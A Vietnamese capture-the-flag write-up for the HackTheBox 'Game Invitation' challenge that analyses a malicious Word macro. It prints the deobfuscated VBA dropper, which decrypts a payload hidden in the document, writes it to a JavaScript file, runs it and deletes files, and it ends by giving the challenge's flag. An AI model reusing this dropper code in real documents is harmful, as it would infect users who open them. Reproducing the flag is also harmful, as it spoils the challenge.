...
## Link challenge 
> https://app.hackthebox.com/challenges/Game%2520Invitation
## Solution
- Bài này cung cấp cho chúng ta 1 file word chứa macro, ta tiến hành sử dụng olevba để phân tích 
<details>
    <summary>
...
- Có vẻ nó bị obfuscate các biến và tên hàm. Ta sửa lại 1 tí cho dễ nhìn
    
```php
Public jsScriptPath As String
Public appDataPath As String

Function DecryptData(encryptedData() As Byte, dataLength As Long) As Boolean
    Dim xorKey As Byte
    xorKey = 45
    For i = 0 To dataLength - 1
        encryptedData(i) = encryptedData(i) Xor xorKey
        xorKey = ((xorKey Xor 99) Xor (i Mod 254))
    Next i
    DecryptData = True
End Function
...
Sub AutoClose() 'delete the js script'
    ...
    fileSystem.DeleteFile appDataPath & "\*.*", True
...
Sub AutoOpen()
    ...
    domainToCheck = "GAMEMASTERS.local"
    userDomain = Environ$("UserDomain")
    If domainToCheck <> userDomain Then
        Exit Sub
    End If
    ...
    fileHandle = FreeFile
    Open (ActiveDocument.FullName) For Binary As #fileHandle
    Dim fileData() As Byte
    ReDim fileData(fileLength)
    Get #fileHandle, 1, fileData
    Dim fileContent As String
    fileContent = StrConv(fileData, vbUnicode)
    
    Dim regexMatches
    Dim regexObject
    Set regexObject = CreateObject("vbscript.regexp")
    regexObject.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set regexMatches = regexObject.Execute(fileContent)
    ...
    dataSize = 13082
    ReDim decryptedData(dataSize)
    Get #fileHandle, matchIndex + 81, decryptedData
    
    If Not DecryptData(decryptedData(), dataSize + 1) Then
        GoTo ErrorHandler
    End If
    ...
    Dim jsFileHandle
    jsFileHandle = FreeFile
    jsScriptPath = appDataPath & "\" & "mailform.js"
    Open (jsScriptPath) For Binary As #jsFileHandle
    Put #jsFileHandle, 1, decryptedData
    Close #jsFileHandle
    Erase decryptedData
    
    Set shell = CreateObject("WScript.Shell")
    shell.Run """" + jsScriptPath + """" + " vF8rdgMHKBrvCoCp0ulm"
    ActiveDocument.Save
    Exit Sub
...
End Sub
```
- Nhìn vào src ta thấy rằng đoạn macro này đang cố gắng mở file word hiện tại dưới dạng byte và tìm chuỗi "sWcDWp36x5oIe2hJGnRy1iC92A..." 
```
Open (ActiveDocument.FullName) For Binary As #fileHandle
regexObject.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
Set regexMatches = regexObject.Execute(fileContent) 
```
- Cuối cùng decrypt bằng hàm `DecryptData` và lưu vào file js và thực thi với đầu vào là chuỗi `vF8rdgMHKBrvCoCp0ulm`
```
Function DecryptData(encryptedData() As Byte, dataLength As Long) As Boolean
    Dim xorKey As Byte
    xorKey = 45
...
shell.Run """" + jsScriptPath + """" + " vF8rdgMHKBrvCoCp0ulm"
```
- Bây giờ ta đã hiểu cách nó hoạt động, ta đơn giản hóa bằng cách tách các dữ liệu cần lấy ra trước.
- Ta sử dụng công cụ online hexed.it
- ![image](https://hackmd.io/_uploads/Hy-SAVJMJl.png)
- Mình trích xuất ra file b.dat từ offset `0x0001FCB9` và viết script python nhỏ để decode dựa trên mã nguồn của nó 
```python
def xor(dt, length):
    key = 45
    output = ""
    for i in range(length):
        ...
        key = (key ^ 99) ^ (i % 254)
    print(output)
with open("b.dat", "rb") as file:
    data = bytearray(file.read(13082))
    xor(data, len(data))
```
- ![image](https://hackmd.io/_uploads/S1oAAEJM1g.png)
- Ta thành công lấy file js được thực thi ra nhưng có vẻ mã hơi khó nhìn, dùng cyberchef để sửa lại cho dễ nhìn.
...
```
- Đọc src ta thấy rằng chương trình này xử lý 1 tham số đầu vào (ở đây là "vF8rdgMHKBrvCoCp0ulm" từ mã vbscript) và sau đó thực thi nó thông qua hàm eval()
- Việc của chúng ta bây giờ là thay thế hàm eval() hành hàm console.log() để xem dữ liệu chúng thực thi là gì.
- ![image](https://hackmd.io/_uploads/H1jMdOkzyl.png)
```
...
```
- Tại phần `("Cookie:","flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=")` ta thu được flag
